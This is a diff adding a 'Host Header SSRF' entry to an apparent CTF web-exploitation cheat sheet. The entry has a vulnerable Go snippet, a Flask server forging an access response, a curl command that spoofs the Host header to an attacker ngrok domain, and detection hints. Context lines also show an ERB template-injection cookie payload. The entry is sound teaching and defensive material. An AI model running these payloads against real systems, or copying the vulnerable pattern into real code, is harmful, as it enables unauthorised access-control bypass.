@@ -17,6 +17,7 @@
   - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
   - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
 - [SSRF](#ssrf)
+  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
   - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
   - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
 - [XXE (XML External Entity)](#xxe-xml-external-entity)
@@ -299,6 +300,37 @@ curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
 ---
 
 ## SSRF
+
+### Host Header SSRF (MireaCTF)
+
+Server-side code uses the HTTP `Host` header to construct internal validation requests:
+```go
+// Vulnerable: uses client-controlled Host header for internal request
+response, err := http.Get("http://" + c.Request.Host + "/validate")
+```
+
+**Exploitation:**
+1. Set up an attacker-controlled server returning the desired response:
+   ```python
+   from flask import Flask
+   app = Flask(__name__)
+
+   @app.route("/validate")
+   def validate():
+       return '{"access": true}'
+
+   app.run(host='0.0.0.0', port=5000)
+   ```
+2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
+   ```bash
+   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
+   ```
+
+**Key insight:** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.
+
+**Detection:** Server code that builds URLs from `request.Host`, `request.headers['Host']`, `c.Request.Host` (Go/Gin), or `$_SERVER['HTTP_HOST']` (PHP) for internal service calls.
+
+---
 
 ### DNS Rebinding for TOCTOU
 ```python
